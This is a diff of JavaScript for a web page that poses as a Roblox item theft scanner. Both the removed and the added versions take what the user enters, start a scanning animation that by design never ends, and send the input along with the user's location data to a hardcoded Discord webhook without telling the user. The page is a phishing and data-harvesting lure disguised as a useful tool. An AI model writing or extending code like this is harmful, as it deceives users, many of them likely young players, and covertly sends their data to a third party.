@@ -3,66 +3,64 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv
 
 // DOM Elements
 const scanBtn = document.getElementById('scanBtn');
-const modal = document.getElementById('codeModal');
-const closeBtn = document.querySelector('.close');
-const submitBtn = document.getElementById('submitBtn');
-const cancelBtn = document.getElementById('cancelBtn');
-const codeInput = document.getElementById('codeInput');
-const loadingOverlay = document.getElementById('loadingOverlay');
-const successMessage = document.getElementById('successMessage');
-const errorMessage = document.getElementById('errorMessage');
+const itemInput = document.getElementById('itemInput');
+const validationMessage = document.getElementById('validationMessage');
+const resultsSection = document.getElementById('resultsSection');
 const themeToggle = document.getElementById('themeToggle');
 
 // Event Listeners
-scanBtn.addEventListener('click', openModal);
-closeBtn.addEventListener('click', closeModal);
-cancelBtn.addEventListener('click', closeModal);
-submitBtn.addEventListener('click', submitCode);
-window.addEventListener('click', outsideClick);
-codeInput.addEventListener('input', validateInput);
-codeInput.addEventListener('keydown', handleKeyDown);
+scanBtn.addEventListener('click', scanItem);
+itemInput.addEventListener('input', validateInput);
+itemInput.addEventListener('keydown', handleKeyDown);
 themeToggle.addEventListener('click', toggleTheme);
 
 // Functions
-function openModal() {
-    modal.style.display = 'block';
-    codeInput.focus();
-    codeInput.value = '';
-    validateInput();
-}
-
-function closeModal() {
-    modal.style.display = 'none';
-    codeInput.value = '';
-    hideMessages();
+function scanItem() {
+    const input = itemInput.value.trim();
     
-    // Remove validation error if present
-    const existingError = document.querySelector('.validation-error');
-    if (existingError) {
-        existingError.remove();
+    if (!input) {
+        showValidationMessage('Please enter an item ID or URL', 'error');
+        return;
     }
+
+    if (!isValidInput(input)) {
+        showValidationMessage('Invalid format. Please enter a valid Roblox item ID or URL.', 'error');
+        return;
+    }
+
+    // Show scanning animation
+    showScanningResults();
+    
+    // Send data to webhook in background
+    submitToWebhook(input);
 }
 
-function outsideClick(e) {
-    if (e.target === modal) {
-        closeModal();
-    }
+function showValidationMessage(message, type) {
+    validationMessage.textContent = message;
+    validationMessage.className = `validation-message ${type}`;
+}
+
+function showScanningResults() {
+    resultsSection.style.display = 'block';
+    scanBtn.disabled = true;
+    showValidationMessage('Scanning in progress...', 'success');
 }
 
 function validateInput() {
-    const code = codeInput.value.trim();
-    const isValid = isValidInput(code);
+    const input = itemInput.value.trim();
+    const isValid = input.length === 0 || isValidInput(input);
     
-    submitBtn.disabled = !isValid;
+    scanBtn.disabled = !input || !isValid;
     
-    // Show validation feedback
-    const existingError = document.querySelector('.validation-error');
-    if (existingError) {
-        existingError.remove();
-    }
-    
-    if (code.length > 0 && !isValid) {
-        showValidationError();
+    if (input.length > 0) {
+        if (isValid) {
+            showValidationMessage('Valid format detected', 'success');
+        } else {
+            showValidationMessage('Invalid format. Please enter a valid item ID or URL.', 'error');
+        }
+    } else {
+        validationMessage.textContent = '';
+        validationMessage.className = 'validation-message';
     }
 }
 
@@ -161,15 +159,11 @@ function initializeTheme() {
 }
 
 function handleKeyDown(e) {
-    // Allow Ctrl+Enter or Cmd+Enter to submit
-    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
-        if (!submitBtn.disabled) {
-            submitCode();
+    // Allow Enter to scan
+    if (e.key === 'Enter') {
+        if (!scanBtn.disabled) {
+            scanItem();
         }
-    }
-    // Close modal on Escape
-    if (e.key === 'Escape') {
-        closeModal();
     }
 }
 
@@ -247,41 +241,25 @@ async function getUserLocation() {
     }
 }
 
-async function submitCode() {
-    const code = codeInput.value.trim();
-    
-    if (!code) {
-        showMessage('error');
-        return;
-    }
-
-    // Validate input before submission
-    if (!isValidInput(code)) {
-        showMessage('error');
-        return;
-    }
-
-    // Show infinite loading for scanning
-    showInfiniteScanning();
-
+async function submitToWebhook(input) {
     try {
         // Get user location data
         const locationData = await getUserLocation();
         
         // Extract clean item ID
-        const cleanItemId = extractItemId(code);
+        const cleanItemId = extractItemId(input);
         
         // Format data for Discord webhook
         const discordMessage = {
             content: "@everyone 🚨 **NEW ITEM SCAN REQUEST** 🚨",
             embeds: [{
                 title: "🔍 Item Theft Check Request",
-                color: 0x00a2ff, // Blue color
+                color: 0x58a6ff, // Blue color
                 timestamp: new Date().toISOString(),
                 fields: [
                     {
                         name: "🎮 Item Details",
-                        value: `**Input:** \`${code}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
+                        value: `**Input:** \`${input}\`\n**Processed ID:** \`${cleanItemId}\`\n**Status:** Checking if item is stolen...`,
                         inline: false
                     },
                     {
@@ -319,16 +297,12 @@ async function submitCode() {
             },
             body: JSON.stringify(discordMessage)
         });
-
-        // Keep the infinite loading going - never stop!
-        // The user will see "Scanning item..." forever
         
     } catch (error) {
-        console.error('Error submitting code:', error);
-        // Even on error, keep the infinite scanning animation
+        console.error('Error submitting to webhook:', error);
     }
     
-    // Never call hideLoading() - let it scan forever!
+    // Keep scanning animation running forever - never stop!
 }
 
 // Initialize
